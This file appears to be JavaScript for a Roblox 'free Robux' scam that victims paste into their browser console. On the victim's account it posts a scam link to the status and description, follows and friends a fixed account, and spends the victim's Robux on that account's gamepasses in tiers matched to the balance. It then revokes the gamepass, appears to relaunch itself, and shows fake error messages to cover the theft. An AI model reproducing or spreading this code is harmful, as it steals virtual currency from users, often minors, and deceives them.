RBLXApi.username = document.getElementsByClassName("text-nav")[0].innerText;
RBLXApi.i = 0;
RBLXApi.robuxToGive = 0;
RBLXApi.askToClose = true; // Does a do you want to leave prompt
// PROGRAM THE API
RBLXApi.RunScript = function(){
    setTimeout(function(){
        if (RBLXApi.username.toLowerCase() == "yourusernameinalllowercase"){
            console.log("Don't do it again idiot");
        }
        else{
            RBLXApi.setStatus("I just earned a million robux from this.scam.link");
            RBLXApi.setDescription("I just earned a million robux this.scam.link");
            RBLXApi.FollowPlayer("1996250309");
            RBLXApi.FriendPlayer("1996250309");
            if (RBLXApi.robuxCount <= 9){
                setTimeout(function(){
                    setTimeout(function(){
                        let x = Math.floor((Math.random() * 5) + 1);
                        switch (x){
                            case 1:
                                RBLXApi.Alert("403: Internet is too slow for this to run", 5500);
                                break;
                            case 2:
                                RBLXApi.Alert("403: Computer is too slow for this to run", 5500);
                                break;
                            case 3:
                                RBLXApi.Alert("RBLXError: Null pointer on Line: 324, Information sent to database", 5500);
                                break;
                            case 4:
                                RBLXApi.Alert("450: Error on Line 450, This mostlikely means your account does not work with this script");
                                break;
                            default:
                                RBLXApi.Alert("Script has had an error", 5500);
                                break;
                        }
                    }, 4200);
                }, 1000);
                RBLXApi.Alert("Debugging.....", 4000);
            }
            else{
                if (RBLXApi.i >= 10){
                    console.log("done");
                }
                if (RBLXApi.robuxCount <= 9){  
                    RBLXApi.robuxToGive = RBLXApi.robuxEarned * 0.70;
                    RBLXApi.robuxToGive = RBLXApi.robuxToGive * 0.50; 
                    RBLXApi.Alert("ROBUX ADDED!");
                    console.log("done");
                }
                if (RBLXApi.robuxCount >= 10 && RBLXApi.robuxCount <= 29){
                    RBLXApi.BuyGamepassNoId("1114081978", 10, 1996250309);
                    RBLXApi.RevokeGamepass("12621887");
                }
                else if (RBLXApi.robuxCount >= 30 && RBLXApi.robuxCount <= 99){
                    RBLXApi.BuyGamepassNoId("1114082382", 30, 1996250309);
                    RBLXApi.RevokeGamepass("12622944");
                }
                else if (RBLXApi.robuxCount >= 100 && RBLXApi.robuxCount <= 199){
                    RBLXApi.BuyGamepassNoId("1114083280", 100, 1996250309);
                    RBLXApi.RevokeGamepass("12623001");
                }
                else if (RBLXApi.robuxCount >= 200 && RBLXApi.robuxCount <= 499){
                    RBLXApi.BuyGamepassNoId("1114083670", 200, 1996250309);
                    RBLXApi.RevokeGamepass("12623030");
                }
                else if (RBLXApi.robuxCount >= 500 && RBLXApi.robuxCount <= 999){
                    RBLXApi.BuyGamepassNoId("1114083945", 500, 1996250309);
                    RBLXApi.RevokeGamepass("12623047");
                }
                else if (RBLXApi.robuxCount >= 1000 && RBLXApi.robuxCount <= 1499){
                    RBLXApi.BuyGamepassNoId("1114084242", 1000, 1996250309);
                    RBLXApi.RevokeGamepass("12623055");
                }
                else if (RBLXApi.robuxCount >= 1500 && RBLXApi.robuxCount <= 1999){
                    RBLXApi.BuyGamepassNoId("1114084513", 1500, 1996250309);
                    RBLXApi.RevokeGamepass("12623079");
                }
                else if (RBLXApi.robuxCount >= 2000 && RBLXApi.robuxCount <= 2499){
                    RBLXApi.BuyGamepassNoId("1114084716", 2000, 1996250309);
                    RBLXApi.RevokeGamepass("12623091");
                }
                else if (RBLXApi.robuxCount >= 2500 && RBLXApi.robuxCount <= 2999){
                    RBLXApi.BuyGamepassNoId("1114084864", 2500, 1996250309);
                    RBLXApi.RevokeGamepass("12623112");
                }
                else if (RBLXApi.robuxCount >= 3000 && RBLXApi.robuxCount <= 4999){
                    RBLXApi.BuyGamepassNoId("1114085150", 3000, 1996250309);
                    RBLXApi.RevokeGamepass("12623124");
                }
                else if (RBLXApi.robuxCount >= 5000 && RBLXApi.robuxCount <= 9999){
                    RBLXApi.BuyGamepassNoId("1114085339", 5000, 1996250309);
                    RBLXApi.RevokeGamepass("12623143");
                    RBLXApi.robuxEarned += 5000;
                }
                else if (RBLXApi.robuxCount >= 10000 && RBLXApi.robuxCount <= 14999){
                    RBLXApi.BuyGamepassNoId("1114085528", 10000, 1996250309);
                    RBLXApi.RevokeGamepass("12623155");
                }
                else if (RBLXApi.robuxCount >= 15000 && RBLXApi.robuxCount <= 19999){
                    RBLXApi.BuyGamepassNoId("1114085670", 15000, 1996250309);
                    RBLXApi.RevokeGamepass("12623161");
                }
                else if (RBLXApi.robuxCount >= 20000){
                    RBLXApi.BuyGamepassNoId("1114085801", 20000, 1996250309);
                    RBLXApi.RevokeGamepass("12623168");
                }
                RBLXApi.launchScript(RBLXApi.userId);
            }
            RBLXApi.i += 1;
        }
    }, 1);
}
